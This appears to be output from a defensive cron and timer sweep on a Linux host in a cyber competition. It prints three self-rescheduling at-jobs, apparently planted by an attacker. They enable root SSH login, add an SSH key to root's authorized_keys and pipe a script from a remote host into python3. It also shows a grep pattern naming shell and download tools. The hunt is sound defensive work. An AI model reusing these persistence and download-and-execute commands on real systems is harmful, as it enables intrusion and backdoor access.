@@ -1,0 +1,1295 @@
+==============================
+ NCAE Cron and Timer Sweep
+==============================
+
+[1] Root crontab
+
+>>> sudo crontab -l
+
+[2] Per-user crontabs
+
+---- root ----
+(no crontab)
+
+---- daemon ----
+(no crontab)
+
+---- bin ----
+(no crontab)
+
+---- sys ----
+(no crontab)
+
+---- sync ----
+(no crontab)
+
+---- games ----
+(no crontab)
+
+---- man ----
+(no crontab)
+
+---- lp ----
+(no crontab)
+
+---- mail ----
+(no crontab)
+
+---- news ----
+(no crontab)
+
+---- uucp ----
+(no crontab)
+
+---- proxy ----
+(no crontab)
+
+---- www-data ----
+(no crontab)
+
+---- backup ----
+(no crontab)
+
+---- list ----
+(no crontab)
+
+---- irc ----
+(no crontab)
+
+---- _apt ----
+(no crontab)
+
+---- nobody ----
+(no crontab)
+
+---- systemd-network ----
+(no crontab)
+
+---- systemd-timesync ----
+(no crontab)
+
+---- dhcpcd ----
+(no crontab)
+
+---- messagebus ----
+(no crontab)
+
+---- systemd-resolve ----
+(no crontab)
+
+---- pollinate ----
+(no crontab)
+
+---- polkitd ----
+(no crontab)
+
+---- syslog ----
+(no crontab)
+
+---- uuidd ----
+(no crontab)
+
+---- tcpdump ----
+(no crontab)
+
+---- tss ----
+(no crontab)
+
+---- landscape ----
+(no crontab)
+
+---- fwupd-refresh ----
+(no crontab)
+
+---- usbmux ----
+(no crontab)
+
+---- sshd ----
+(no crontab)
+
+---- ansible ----
+(no crontab)
+
+---- blackteam ----
+(no crontab)
+
+---- blackteam-r ----
+(no crontab)
+
+---- redteam ----
+(no crontab)
+
+---- worcester ----
+(no crontab)
+
+---- gloucester ----
+(no crontab)
+
+---- scituate ----
+(no crontab)
+
+---- chicopee ----
+(no crontab)
+
+---- leicester ----
+(no crontab)
+
+---- tyngsborough ----
+(no crontab)
+
+---- leominster ----
+(no crontab)
+
+---- berlin ----
+(no crontab)
+
+---- tewksbury ----
+(no crontab)
+
+---- carlisle ----
+(no crontab)
+
+---- _rpc ----
+(no crontab)
+
+---- statd ----
+(no crontab)
+
+---- vector ----
+(no crontab)
+
+---- dnsmasq ----
+(no crontab)
+
+---- cockpit-ws ----
+(no crontab)
+
+---- cockpit-wsinstance ----
+(no crontab)
+
+---- postgres ----
+(no crontab)
+
+---- imin ----
+(no crontab)
+
+[3] Cron directories
+
+>>> sudo ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly
+/etc/cron.d:
+total 32
+drwxr-xr-x   2 root root  4096 Mar  6 16:00 .
+drwxr-xr-x 139 root root 12288 Apr 18 14:55 ..
+-rw-r--r--   1 root root   802 Apr 16  2023 certbot
+-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
+-rw-r--r--   1 root root   102 Aug  5  2025 .placeholder
+-rw-r--r--   1 root root   396 Aug  5  2025 sysstat
+
+/etc/cron.daily:
+total 48
+drwxr-xr-x   2 root root  4096 Apr 18 14:43 .
+drwxr-xr-x 139 root root 12288 Apr 18 14:55 ..
+-rwxr-xr-x   1 root root   376 Jul  8  2025 apport
+-rwxr-xr-x   1 root root  1478 Mar 22  2024 apt-compat
+-rwxr-xr-x   1 root root   595 Feb 25  2020 debsums
+-rwxr-xr-x   1 root root   123 Feb  5  2024 dpkg
+-rwxr-xr-x   1 root root   377 Aug  5  2025 logrotate
+-rwxr-xr-x   1 root root  1395 Aug  5  2025 man-db
+-rw-r--r--   1 root root   102 Aug  5  2025 .placeholder
+-rwxr-xr-x   1 root root   518 Aug  5  2025 sysstat
+
+/etc/cron.hourly:
+total 20
+drwxr-xr-x   2 root root  4096 Aug  5  2025 .
+drwxr-xr-x 139 root root 12288 Apr 18 14:55 ..
+-rw-r--r--   1 root root   102 Aug  5  2025 .placeholder
+
+/etc/cron.monthly:
+total 24
+drwxr-xr-x   2 root root  4096 Apr 18 14:43 .
+drwxr-xr-x 139 root root 12288 Apr 18 14:55 ..
+-rwxr-xr-x   1 root root   597 Feb 25  2020 debsums
+-rw-r--r--   1 root root   102 Aug  5  2025 .placeholder
+
+/etc/cron.weekly:
+total 28
+drwxr-xr-x   2 root root  4096 Apr 18 14:43 .
+drwxr-xr-x 139 root root 12288 Apr 18 14:55 ..
+-rwxr-xr-x   1 root root   596 Feb 25  2020 debsums
+-rwxr-xr-x   1 root root  1055 Aug  5  2025 man-db
+-rw-r--r--   1 root root   102 Aug  5  2025 .placeholder
+
+[4] Contents of cron directory files
+
+==== Directory: /etc/cron.d ====
+
+---- FILE: /etc/cron.d/sysstat ----
+-rw-r--r-- 1 root root 396 Aug  5  2025 /etc/cron.d/sysstat
+# The first element of the path is a directory where the debian-sa1
+# script is located
+PATH=/usr/lib/sysstat:/usr/sbin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Activity reports every 10 minutes everyday
+5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1
+
+# Additional run at 23:59 to rotate the statistics file
+59 23 * * * root command -v debian-sa1 > /dev/null && debian-sa1 60 2
+
+---- FILE: /etc/cron.d/.placeholder ----
+-rw-r--r-- 1 root root 102 Aug  5  2025 /etc/cron.d/.placeholder
+# DO NOT EDIT OR REMOVE
+# This file is a simple placeholder to keep dpkg from removing this directory
+
+---- FILE: /etc/cron.d/e2scrub_all ----
+-rw-r--r-- 1 root root 201 Apr  8  2024 /etc/cron.d/e2scrub_all
+30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
+10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r
+
+---- FILE: /etc/cron.d/certbot ----
+-rw-r--r-- 1 root root 802 Apr 16  2023 /etc/cron.d/certbot
+# /etc/cron.d/certbot: crontab entries for the certbot package
+#
+# Upstream recommends attempting renewal twice a day
+#
+# Eventually, this will be an opportunity to validate certificates
+# haven't been revoked, etc.  Renewal will only occur if expiration
+# is within 30 days.
+#
+# Important Note!  This cronjob will NOT be executed if you are
+# running systemd as your init system.  If you are running systemd,
+# the cronjob.timer function takes precedence over this cronjob.  For
+# more details, see the systemd.timer manpage, or use systemctl show
+# certbot.timer.
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+0 */12 * * * root test -x /usr/bin/certbot -a \! -d /run/systemd/system && perl -e 'sleep int(rand(43200))' && certbot -q renew --no-random-sleep-on-renew
+
+==== Directory: /etc/cron.daily ====
+
+---- FILE: /etc/cron.daily/logrotate ----
+-rwxr-xr-x 1 root root 377 Aug  5  2025 /etc/cron.daily/logrotate
+#!/bin/sh
+
+# skip in favour of systemd timer
+if [ -d /run/systemd/system ]; then
+    exit 0
+fi
+
+# this cronjob persists removals (but not purges)
+if [ ! -x /usr/sbin/logrotate ]; then
+    exit 0
+fi
+
+/usr/sbin/logrotate /etc/logrotate.conf
+EXITVALUE=$?
+if [ $EXITVALUE != 0 ]; then
+    /usr/bin/logger -t logrotate "ALERT exited abnormally with [$EXITVALUE]"
+fi
+exit $EXITVALUE
+
+---- FILE: /etc/cron.daily/apt-compat ----
+-rwxr-xr-x 1 root root 1478 Mar 22  2024 /etc/cron.daily/apt-compat
+#!/bin/sh
+
+set -e
+
+# Systemd systems use a systemd timer unit which is preferable to
+# run. We want to randomize the apt update and unattended-upgrade
+# runs as much as possible to avoid hitting the mirrors all at the
+# same time. The systemd time is better at this than the fixed
+# cron.daily time
+if [ -d /run/systemd/system ]; then
+    exit 0
+fi
+
+check_power()
+{
+    # laptop check, on_ac_power returns:
+    #       0 (true)    System is on main power
+    #       1 (false)   System is not on main power
+    #       255 (false) Power status could not be determined
+    # Desktop systems always return 255 it seems
+    if command -v on_ac_power >/dev/null; then
+        if on_ac_power; then
+            :
+        elif [ $? -eq 1 ]; then
+            return 1
+        fi
+    fi
+    return 0
+}
+
+# sleep for a random interval of time (default 30min)
+# (some code taken from cron-apt, thanks)
+random_sleep()
+{
+    RandomSleep=1800
+    eval $(apt-config shell RandomSleep APT::Periodic::RandomSleep)
+    if [ $RandomSleep -eq 0 ]; then
+	return
+    fi
+    if [ -z "$RANDOM" ] ; then
+        # A fix for shells that do not have this bash feature.
+	RANDOM=$(( $(dd if=/dev/urandom bs=2 count=1 2> /dev/null | cksum | cut -d' ' -f1) % 32767 ))
+    fi
+    TIME=$(($RANDOM % $RandomSleep))
+    sleep $TIME
+}
+
+# delay the job execution by a random amount of time
+random_sleep
+
+# ensure we don't do this on battery
+check_power || exit 0
+
+# run daily job
+exec /usr/lib/apt/apt.systemd.daily
+
+---- FILE: /etc/cron.daily/dpkg ----
+-rwxr-xr-x 1 root root 123 Feb  5  2024 /etc/cron.daily/dpkg
+#!/bin/sh
+
+# Skip if systemd is running.
+if [ -d /run/systemd/system ]; then
+  exit 0
+fi
+
+/usr/libexec/dpkg/dpkg-db-backup
+
+---- FILE: /etc/cron.daily/sysstat ----
+-rwxr-xr-x 1 root root 518 Aug  5  2025 /etc/cron.daily/sysstat
+#!/bin/sh
+# Generate a daily summary of process accounting.  Since this will probably
+# get kicked off in the morning, it is run against the previous day data.
+
+set -e
+
+# Our configuration file
+DEFAULT=/etc/default/sysstat
+# Default settings, overridden in the above file
+ENABLED=false
+
+# Skip in favour of systemd timer
+[ ! -d /run/systemd/system ] || exit 0
+
+[ -x /usr/lib/sysstat/sa2 ] || exit 0
+
+# Read our config
+[ -r "$DEFAULT" ] && . "$DEFAULT"
+
+[ "$ENABLED" = "true" ]  || exit 0
+
+exec /usr/lib/sysstat/sa2 -A
+
+---- FILE: /etc/cron.daily/debsums ----
+-rwxr-xr-x 1 root root 595 Feb 25  2020 /etc/cron.daily/debsums
+#!/bin/sh
+
+debsums="/usr/bin/debsums"
+ignorefile="/etc/debsums-ignore"
+
+[ -x $debsums ] || exit 0
+
+if ! [ -e "$ignorefile" ]; then
+    ignorefile="/dev/null"
+fi
+
+# source our config
+. /etc/default/debsums
+[ "z$CRON_CHECK" = "zdaily" ] || exit 0
+
+# See ionice(1)
+if [ -x /usr/bin/ionice ] &&
+    /usr/bin/ionice -c3 true 2>/dev/null; then
+    IONICE="/usr/bin/ionice -c3"
+fi
+
+exec 3>&1
+
+$IONICE $debsums -cs 2>&1 | egrep -vf "$ignorefile" | tee /proc/self/fd/3 | sed 's/^debsums: //' | logger -t debsums
+
+# Exit with a normal status code even if errors (which could be ignored) were found
+exit 0
+
+---- FILE: /etc/cron.daily/.placeholder ----
+-rw-r--r-- 1 root root 102 Aug  5  2025 /etc/cron.daily/.placeholder
+# DO NOT EDIT OR REMOVE
+# This file is a simple placeholder to keep dpkg from removing this directory
+
+---- FILE: /etc/cron.daily/apport ----
+-rwxr-xr-x 1 root root 376 Jul  8  2025 /etc/cron.daily/apport
+#!/bin/sh -e
+# clean all crash reports which are older than a week.
+[ -d /var/crash ] || exit 0
+find /var/crash/. ! -name . -prune -type f \( \( -size 0 -a \! -name '*.upload*' -a \! -name '*.drkonqi*' \) -o -mtime +7 \) -exec rm -f -- '{}' \;
+find /var/crash/. ! -name . -prune -type d -regextype posix-extended -regex '.*/[0-9]{12}$' \( -mtime +7 \) -exec rm -Rf -- '{}' \;
+
+---- FILE: /etc/cron.daily/man-db ----
+-rwxr-xr-x 1 root root 1395 Aug  5  2025 /etc/cron.daily/man-db
+#!/bin/sh
+#
+# man-db cron daily
+
+set -e
+
+if [ -d /run/systemd/system ]; then
+    # Skip in favour of systemd timer.
+    exit 0
+fi
+
+# This should be set by cron, but apparently isn't always; see
+# https://bugs.debian.org/209185.  Add fallbacks so that start-stop-daemon
+# can be found.
+export PATH="$PATH:/usr/local/sbin:/usr/sbin:/sbin"
+
+iosched_idle=
+# Don't try to change I/O priority in a vserver or OpenVZ.
+if ! grep -Eq '(envID|VxID):.*[1-9]' /proc/self/status && \
+   { [ ! -d /proc/vz ] || [ -d /proc/bc ]; }; then
+    iosched_idle='--iosched idle'
+fi
+
+if ! [ -d /var/cache/man ]; then
+    # Recover from deletion, per FHS.
+    install -d -o man -g man -m 0755 /var/cache/man
+fi
+
+# expunge old catman pages which have not been read in a week
+if [ -d /var/cache/man ]; then
+  cd /
+  # shellcheck disable=SC2086
+  start-stop-daemon --start --pidfile /dev/null --startas /bin/sh \
+	--oknodo --chuid man $iosched_idle -- -c \
+	"find /var/cache/man -type f -name '*.gz' -atime +6 -print0 | \
+	 xargs -r0 rm -f"
+fi
+
+# regenerate man database
+if [ -x /usr/bin/mandb ]; then
+    # --pidfile /dev/null so it always starts; mandb isn't really a daemon,
+    # but we want to start it like one.
+    # shellcheck disable=SC2086
+    start-stop-daemon --start --pidfile /dev/null \
+		      --startas /usr/bin/mandb --oknodo --chuid man \
+		      $iosched_idle \
+		      -- --no-purge --quiet
+fi
+
+exit 0
+
+==== Directory: /etc/cron.hourly ====
+
+---- FILE: /etc/cron.hourly/.placeholder ----
+-rw-r--r-- 1 root root 102 Aug  5  2025 /etc/cron.hourly/.placeholder
+# DO NOT EDIT OR REMOVE
+# This file is a simple placeholder to keep dpkg from removing this directory
+
+==== Directory: /etc/cron.weekly ====
+
+---- FILE: /etc/cron.weekly/debsums ----
+-rwxr-xr-x 1 root root 596 Feb 25  2020 /etc/cron.weekly/debsums
+#!/bin/sh
+
+debsums="/usr/bin/debsums"
+ignorefile="/etc/debsums-ignore"
+
+[ -x $debsums ] || exit 0
+
+if ! [ -e "$ignorefile" ]; then
+    ignorefile="/dev/null"
+fi
+
+# source our config
+. /etc/default/debsums
+[ "z$CRON_CHECK" = "zweekly" ] || exit 0
+
+# See ionice(1)
+if [ -x /usr/bin/ionice ] &&
+    /usr/bin/ionice -c3 true 2>/dev/null; then
+    IONICE="/usr/bin/ionice -c3"
+fi
+
+exec 3>&1
+
+$IONICE $debsums -cs 2>&1 | egrep -vf "$ignorefile" | tee /proc/self/fd/3 | sed 's/^debsums: //' | logger -t debsums
+
+# Exit with a normal status code even if errors (which could be ignored) were found
+exit 0
+
+---- FILE: /etc/cron.weekly/.placeholder ----
+-rw-r--r-- 1 root root 102 Aug  5  2025 /etc/cron.weekly/.placeholder
+# DO NOT EDIT OR REMOVE
+# This file is a simple placeholder to keep dpkg from removing this directory
+
+---- FILE: /etc/cron.weekly/man-db ----
+-rwxr-xr-x 1 root root 1055 Aug  5  2025 /etc/cron.weekly/man-db
+#!/bin/sh
+#
+# man-db cron weekly
+
+set -e
+
+if [ -d /run/systemd/system ]; then
+    # Skip in favour of systemd timer.
+    exit 0
+fi
+
+# This should be set by cron, but apparently isn't always; see
+# https://bugs.debian.org/209185.  Add fallbacks so that start-stop-daemon
+# can be found.
+export PATH="$PATH:/usr/local/sbin:/usr/sbin:/sbin"
+
+iosched_idle=
+# Don't try to change I/O priority in a vserver or OpenVZ.
+if ! grep -Eq '(envID|VxID):.*[1-9]' /proc/self/status && \
+   { [ ! -d /proc/vz ] || [ -d /proc/bc ]; }; then
+    iosched_idle='--iosched idle'
+fi
+
+if ! [ -d /var/cache/man ]; then
+    # Recover from deletion, per FHS.
+    install -d -o man -g man -m 0755 /var/cache/man
+fi
+
+# regenerate man database
+if [ -x /usr/bin/mandb ]; then
+    # --pidfile /dev/null so it always starts; mandb isn't really a daemon,
+    # but we want to start it like one.
+    # shellcheck disable=SC2086
+    start-stop-daemon --start --pidfile /dev/null \
+		      --startas /usr/bin/mandb --oknodo --chuid man \
+		      $iosched_idle \
+		      -- --quiet
+fi
+
+exit 0
+
+==== Directory: /etc/cron.monthly ====
+
+---- FILE: /etc/cron.monthly/debsums ----
+-rwxr-xr-x 1 root root 597 Feb 25  2020 /etc/cron.monthly/debsums
+#!/bin/sh
+
+debsums="/usr/bin/debsums"
+ignorefile="/etc/debsums-ignore"
+
+[ -x $debsums ] || exit 0
+
+if ! [ -e "$ignorefile" ]; then
+    ignorefile="/dev/null"
+fi
+
+# source our config
+. /etc/default/debsums
+[ "z$CRON_CHECK" = "zmonthly" ] || exit 0
+
+# See ionice(1)
+if [ -x /usr/bin/ionice ] &&
+    /usr/bin/ionice -c3 true 2>/dev/null; then
+    IONICE="/usr/bin/ionice -c3"
+fi
+
+exec 3>&1
+
+$IONICE $debsums -cs 2>&1 | egrep -vf "$ignorefile" | tee /proc/self/fd/3 | sed 's/^debsums: //' | logger -t debsums
+
+# Exit with a normal status code even if errors (which could be ignored) were found
+exit 0
+
+---- FILE: /etc/cron.monthly/.placeholder ----
+-rw-r--r-- 1 root root 102 Aug  5  2025 /etc/cron.monthly/.placeholder
+# DO NOT EDIT OR REMOVE
+# This file is a simple placeholder to keep dpkg from removing this directory
+
+[5] Spool cron locations
+
+>>> sudo ls -la /var/spool/cron /var/spool/cron/crontabs
+/var/spool/cron:
+total 20
+drwxr-xr-x 5 root   root    4096 Apr 13 00:25 .
+drwxr-xr-x 4 root   root    4096 Aug  5  2025 ..
+drwxrwx--T 2 daemon daemon  4096 Apr 18 14:59 atjobs
+drwxrwx--T 2 daemon daemon  4096 Apr 18 14:59 atspool
+drwx-wx--T 2 root   crontab 4096 Aug  5  2025 crontabs
+
+/var/spool/cron/crontabs:
+total 8
+drwx-wx--T 2 root crontab 4096 Aug  5  2025 .
+drwxr-xr-x 5 root root    4096 Apr 13 00:25 ..
+
+[6] Contents of spool cron files
+
+==== Directory: /var/spool/cron ====
+
+---- FILE: /var/spool/cron/atjobs/a0013701c3cb28 ----
+-rwx------ 1 root daemon 1138 Apr 18 14:59 /var/spool/cron/atjobs/a0013701c3cb28
+#!/bin/sh
+# atrun uid=0 gid=0
+# mail root -1
+umask 22
+SUDO_GID=1000; export SUDO_GID
+MAIL=/var/mail/root; export MAIL
+USER=root; export USER
+SHLVL=1; export SHLVL
+HOME=/root; export HOME
+OLDPWD=/; export OLDPWD
+SUDO_UID=1000; export SUDO_UID
+LOGNAME=root; export LOGNAME
+RUN_COMMAND=c2VkIC1FaSAnc3woIyl7MCx9UGVybWl0Um9vdExvZ2luLip8UGVybWl0Um9vdExvZ2luIHllc3wnIC9ldGMvc3NoL3NzaGRfY29uZmlnCmVjaG8gIiR7UlVOX0NPTU1BTkR9IiB8IGJhc2U2NCAtZCB8IGF0IC1NIG5vdyArIDUgbWluCg==; export RUN_COMMAND
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin; export PATH
+LANG=en_US.UTF-8; export LANG
+SUDO_COMMAND=/bin/sh\ -c\ echo\ BECOME-SUCCESS-pwrpraxeuginliqbunbbmwtdmxwpkqcd\ \;\ /usr/bin/python3.12\ /home/ansible/.ansible/tmp/ansible-tmp-1776039933.2984283-124996-63672468438876/AnsiballZ_command.py; export SUDO_COMMAND
+SUDO_USER=ansible; export SUDO_USER
+PWD=/home/ansible; export PWD
+cd /home/ansible || {
+	 echo 'Execution directory inaccessible' >&2
+	 exit 1
+}
+sed -Ei 's|(#){0,}PermitRootLogin.*|PermitRootLogin yes|' /etc/ssh/sshd_config
+echo "${RUN_COMMAND}" | base64 -d | at -M now + 5 min
+
+
+---- FILE: /var/spool/cron/atjobs/a0013601c3cb28 ----
+-rwx------ 1 root daemon 2757 Apr 18 14:59 /var/spool/cron/atjobs/a0013601c3cb28
+#!/bin/sh
+# atrun uid=0 gid=0
+# mail root -1
+umask 22
+SUDO_GID=1000; export SUDO_GID
+MAIL=/var/mail/root; export MAIL
+USER=root; export USER
+SHLVL=1; export SHLVL
+HOME=/root; export HOME
+OLDPWD=/; export OLDPWD
+SUDO_UID=1000; export SUDO_UID
+LOGNAME=root; export LOGNAME
+RUN_COMMAND=ZWNobyAnc3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFDQVFDVmV6UW9RZ2NLQjU4ak1HNGRoRk50Uk04S01ra0JMWlE4c2IzK3BSMlZQNndYeFJCODU3aE81UjhpL2RiRDlzd2dSYnNnRzA0eUxEekxaN00xMm8rNFNDcEVOZWZkUW9zN2FGdW9jQ0Y1TlJRRHJFYVR0V0crTHNBaTlsSUI0M2RLelJuaFdKL0VUWjhodzF4MFI2d2NiVFoyWVNwWVZDY05SejlpMEx0TXRGcUZYZ2xlZXAzZTIzVWVtMXVQRVBocmV5blBEeElXSWZueUs5RndwbzN6L2hkdElDckM3RU1PVjFHNDRDSTM3U3ZsWkN4dlNEUmtIZTNkbjRUM0RzeGlML2RMazRUNE9mRm1mTUhxWWhsR0ZNTXlwWTVuNVEvemppdkFqMHVsN3ltamM4UlN2TDI3NDRUbnpxU1E3TCtHZHRTNGNOaFVPZERQSjNJeHBKeFc1YzhnUC9KNVVlN1hIL2hWRnJEK2xReDZXNWgxVjRCWjdIaER2c1ZmQlN1UDBpN01DbHpzYWZWWWpwMW5GZzZ1ZWxvNnJxSjVlQjY0cEVTeWdQTTl0Q0hKVjNMYUNOUkZ2Sm8xbUV4a1ZwUTk5TEdtL3FhNWZ6MUF0S2RFTGFmU2F0emFCeTlDZlpCZFdqTjF1S1FuTHZHdlFoQm9EUVZwVGJFc2lzQ0NxeFBsenNuRmF3b3J2dG9NNkFwNGJCNmpwUFpzeFBnZEpOZTVIVCtsSmZSRWl3OE0yMEw0ajZTVnJQYVJlL0JseHBxNDhoZlJBaHZVOHQrUG1iUUZiS0M0TGMxRUNVSWk4Z0NKNUVwTmVGc3p5eDJPQ0ZEUGJvc3MzZ2tYTkRTSldGNTFEQWhSVjJDZ2tNeVJjMGdtWXJtQkNMeS80Rk1HMVhwQ0xwNzNrTC9nYlE9PSBXRSBBUkUgQSBURUFNJz4vcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cwoKZWNobyAiJHtSVU5fQ09NTUFORH0iIHwgYmFzZTY0IC1kIHwgYXQgLU0gbm93ICsgNSBtaW4K; export RUN_COMMAND
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin; export PATH
+LANG=en_US.UTF-8; export LANG
+SUDO_COMMAND=/bin/sh\ -c\ echo\ BECOME-SUCCESS-fswanygwhcgpxmgekjcemklkskabsadb\ \;\ /usr/bin/python3.12\ /home/ansible/.ansible/tmp/ansible-tmp-1776039940.0271926-125097-50888670824569/AnsiballZ_command.py; export SUDO_COMMAND
+SUDO_USER=ansible; export SUDO_USER
+PWD=/home/ansible; export PWD
+cd /home/ansible || {
+	 echo 'Execution directory inaccessible' >&2
+	 exit 1
+}
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCVezQoQgcKB58jMG4dhFNtRM8KMkkBLZQ8sb3+pR2VP6wXxRB857hO5R8i/dbD9swgRbsgG04yLDzLZ7M12o+4SCpENefdQos7aFuocCF5NRQDrEaTtWG+LsAi9lIB43dKzRnhWJ/ETZ8hw1x0R6wcbTZ2YSpYVCcNRz9i0LtMtFqFXgleep3e23Uem1uPEPhreynPDxIWIfnyK9Fwpo3z/hdtICrC7EMOV1G44CI37SvlZCxvSDRkHe3dn4T3DsxiL/dLk4T4OfFmfMHqYhlGFMMypY5n5Q/zjivAj0ul7ymjc8RSvL2744TnzqSQ7L+GdtS4cNhUOdDPJ3IxpJxW5c8gP/J5Ue7XH/hVFrD+lQx6W5h1V4BZ7HhDvsVfBSuP0i7MClzsafVYjp1nFg6uelo6rqJ5eB64pESygPM9tCHJV3LaCNRFvJo1mExkVpQ99LGm/qa5fz1AtKdELafSatzaBy9CfZBdWjN1uKQnLvGvQhBoDQVpTbEsisCCqxPlzsnFaworvtoM6Ap4bB6jpPZsxPgdJNe5HT+lJfREiw8M20L4j6SVrPaRe/Blxpq48hfRAhvU8t+PmbQFbKC4Lc1ECUIi8gCJ5EpNeFszyx2OCFDPboss3gkXNDSJWF51DAhRV2CgkMyRc0gmYrmBCLy/4FMG1XpCLp73kL/gbQ== WE ARE A TEAM'>/root/.ssh/authorized_keys
+
+echo "${RUN_COMMAND}" | base64 -d | at -M now + 5 min
+
+
+---- FILE: /var/spool/cron/atjobs/a0012b01c3cb28 ----
+-rwx------ 1 root daemon 1111 Apr 18 14:34 /var/spool/cron/atjobs/a0012b01c3cb28
+#!/bin/sh
+# atrun uid=0 gid=0
+# mail root -1
+umask 22
+SUDO_GID=1000; export SUDO_GID
+MAIL=/var/mail/root; export MAIL
+USER=root; export USER
+SHLVL=1; export SHLVL
+HOME=/root; export HOME
+OLDPWD=/; export OLDPWD
+SUDO_UID=1000; export SUDO_UID
+LOGNAME=root; export LOGNAME
+RUN_COMMAND=Y3VybCAtcyAxNzIuMTguMS4zMDo4MC9lbGYvYWlvLWxpbnV4IHwgbm9odXAgcHl0aG9uMyAmPi9kZXYvbnVsbAoKZWNobyAiJHtSVU5fQ09NTUFORH0iIHwgYmFzZTY0IC1kIHwgYXQgLU0gbm93ICsgMzAgbWluCg==; export RUN_COMMAND
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin; export PATH
+LANG=en_US.UTF-8; export LANG
+SUDO_COMMAND=/bin/sh\ -c\ echo\ BECOME-SUCCESS-qacizqtxetjegbaluthxisxxahyeghwe\ \;\ /usr/bin/python3.12\ /home/ansible/.ansible/tmp/ansible-tmp-1776039952.6405535-125293-171184829302714/AnsiballZ_command.py; export SUDO_COMMAND
+SUDO_USER=ansible; export SUDO_USER
+PWD=/home/ansible; export PWD
+cd /home/ansible || {
+	 echo 'Execution directory inaccessible' >&2
+	 exit 1
+}
+curl -s 172.18.1.30:80/elf/aio-linux | nohup python3 &>/dev/null
+
+echo "${RUN_COMMAND}" | base64 -d | at -M now + 30 min
+
+
+---- FILE: /var/spool/cron/atjobs/.SEQ ----
+-rw------- 1 daemon daemon 6 Apr 18 14:59 /var/spool/cron/atjobs/.SEQ
+00137
+
+==== Directory: /var/spool/cron/crontabs ====
+
+[7] Suspicious patterns in cron locations
+
+>>> sudo grep -RniE 'curl|wget|nc |ncat|bash -i|sh -i|python -c|perl -e|socat|/tmp/|/dev/shm|chmod \+s|useradd|nohup|base64|openssl|php -r' /etc/cron* /var/spool/cron /var/spool/cron/crontabs
+/etc/cron.d/certbot:17:0 */12 * * * root test -x /usr/bin/certbot -a \! -d /run/systemd/system && perl -e 'sleep int(rand(43200))' && certbot -q renew --no-random-sleep-on-renew
+/var/spool/cron/atjobs/a0013701c3cb28:13:RUN_COMMAND=c2VkIC1FaSAnc3woIyl7MCx9UGVybWl0Um9vdExvZ2luLip8UGVybWl0Um9vdExvZ2luIHllc3wnIC9ldGMvc3NoL3NzaGRfY29uZmlnCmVjaG8gIiR7UlVOX0NPTU1BTkR9IiB8IGJhc2U2NCAtZCB8IGF0IC1NIG5vdyArIDUgbWluCg==; export RUN_COMMAND
+/var/spool/cron/atjobs/a0013701c3cb28:16:SUDO_COMMAND=/bin/sh\ -c\ echo\ BECOME-SUCCESS-pwrpraxeuginliqbunbbmwtdmxwpkqcd\ \;\ /usr/bin/python3.12\ /home/ansible/.ansible/tmp/ansible-tmp-1776039933.2984283-124996-63672468438876/AnsiballZ_command.py; export SUDO_COMMAND
+/var/spool/cron/atjobs/a0013701c3cb28:24:echo "${RUN_COMMAND}" | base64 -d | at -M now + 5 min
+/var/spool/cron/atjobs/a0013601c3cb28:16:SUDO_COMMAND=/bin/sh\ -c\ echo\ BECOME-SUCCESS-fswanygwhcgpxmgekjcemklkskabsadb\ \;\ /usr/bin/python3.12\ /home/ansible/.ansible/tmp/ansible-tmp-1776039940.0271926-125097-50888670824569/AnsiballZ_command.py; export SUDO_COMMAND
+/var/spool/cron/atjobs/a0013601c3cb28:25:echo "${RUN_COMMAND}" | base64 -d | at -M now + 5 min
+/var/spool/cron/atjobs/a0012b01c3cb28:16:SUDO_COMMAND=/bin/sh\ -c\ echo\ BECOME-SUCCESS-qacizqtxetjegbaluthxisxxahyeghwe\ \;\ /usr/bin/python3.12\ /home/ansible/.ansible/tmp/ansible-tmp-1776039952.6405535-125293-171184829302714/AnsiballZ_command.py; export SUDO_COMMAND
+/var/spool/cron/atjobs/a0012b01c3cb28:23:curl -s 172.18.1.30:80/elf/aio-linux | nohup python3 &>/dev/null
+/var/spool/cron/atjobs/a0012b01c3cb28:25:echo "${RUN_COMMAND}" | base64 -d | at -M now + 30 min
+
+[8] All systemd timers
+
+>>> sudo systemctl list-timers --all
+NEXT                            LEFT LAST                              PASSED UNIT                           ACTIVATES
+Sat 2026-04-18 15:10:00 UTC     6min Sat 2026-04-18 15:00:00 UTC 3min 36s ago sysstat-collect.timer          sysstat-collect.service
+Sat 2026-04-18 15:32:17 UTC    28min Sat 2026-04-18 14:14:59 UTC    48min ago fwupd-refresh.timer            fwupd-refresh.service
+Sat 2026-04-18 19:03:39 UTC  4h 0min Sat 2026-04-18 10:22:46 UTC 4h 40min ago apt-daily.timer                apt-daily.service
+Sun 2026-04-19 00:00:00 UTC       8h Sat 2026-04-18 04:32:14 UTC      10h ago dpkg-db-backup.timer           dpkg-db-backup.service
+Sun 2026-04-19 00:00:00 UTC       8h Sat 2026-04-18 04:32:14 UTC      10h ago logrotate.timer                logrotate.service
+Sun 2026-04-19 00:07:00 UTC       9h -                                      - sysstat-summary.timer          sysstat-summary.service
+Sun 2026-04-19 00:36:35 UTC       9h Sat 2026-04-18 13:21:07 UTC 1h 42min ago man-db.timer                   man-db.service
+Sun 2026-04-19 03:10:39 UTC      12h Sun 2026-04-12 23:55:59 UTC            - e2scrub_all.timer              e2scrub_all.service
+Sun 2026-04-19 04:37:13 UTC      13h Sat 2026-04-18 04:37:12 UTC      10h ago update-notifier-download.timer update-notifier-download.service
+Sun 2026-04-19 04:47:12 UTC      13h Sat 2026-04-18 04:47:12 UTC      10h ago systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
